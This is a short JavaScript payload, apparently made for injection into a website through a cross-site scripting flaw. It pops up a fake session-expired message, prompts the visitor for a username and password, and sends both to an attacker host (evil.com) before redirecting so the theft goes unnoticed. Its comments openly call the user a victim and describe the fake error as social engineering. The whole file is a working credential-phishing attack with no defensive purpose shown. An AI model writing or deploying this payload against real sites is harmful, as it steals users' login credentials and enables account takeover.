alert('Your session end\nPlease input your login info');
var user = prompt("Username / E-mail:"); 				//read first input as username / e-mail
var pass = prompt("Password:");			 				//read second input as password

if (user == null || pass == "") {		 				//make sure that victim doesn't put blank input
    alert('error'); 					 				//make it as if a real error (soc-eng techniques)
    window.location.href = "http://your-website.com/"	//redirect to main page of your-website.com
} else {
    alert('OK');										//make it as if a real true
    var xhttp = new XMLHttpRequest();					//javascript send request
    xhttp.open("GET", "http://evil.com/x.php?u=" + user + "&p=" + pass, true);  //javascript send request
    xhttp.send();										//throw victim input to x.php
    window.location.href = "http://your-website.com/"	//redirect to main page of your-website.com
}